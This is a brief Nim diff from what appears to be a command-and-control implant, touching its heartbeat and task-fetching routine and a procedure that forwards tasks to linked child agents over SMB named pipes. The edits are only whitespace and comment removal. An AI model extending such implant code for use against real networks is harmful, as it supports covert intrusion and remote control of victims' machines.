@@ -10,7 +10,7 @@ proc getTasks*(ctx: AgentCtx): string =
         var heartbeat: Heartbeat = ctx.createHeartbeat()
         let heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
         return ctx.httpGet(heartbeatBytes)
-
+    
     when defined(TRANSPORT_SMB): 
         return ctx.smbRead(ctx.transport.hPipe)
 
@@ -23,16 +23,14 @@ proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
 
 proc forward*(ctx: AgentCtx, agentId: uint32, tasks: seq[seq[byte]], indirectChildTasks: seq[byte] = @[]): bool = 
     var packer = Packer.init()
-
-    # Format the forwarded data properly
+    
     if tasks.len() > 0:
         packer.add(agentId)
         packer.add(cast[uint8](tasks.len()))
         for task in tasks:
             packer.addDataWithLengthPrefix(task)
-
     if indirectChildTasks.len() > 0:
         packer.addData(indirectChildTasks)
     
     let hPipe = cast[HANDLE](ctx.links[agentId]) 
-    return hPipe.pipeWrite(packer.pack())    
+    return hPipe.pipeWrite(packer.pack())
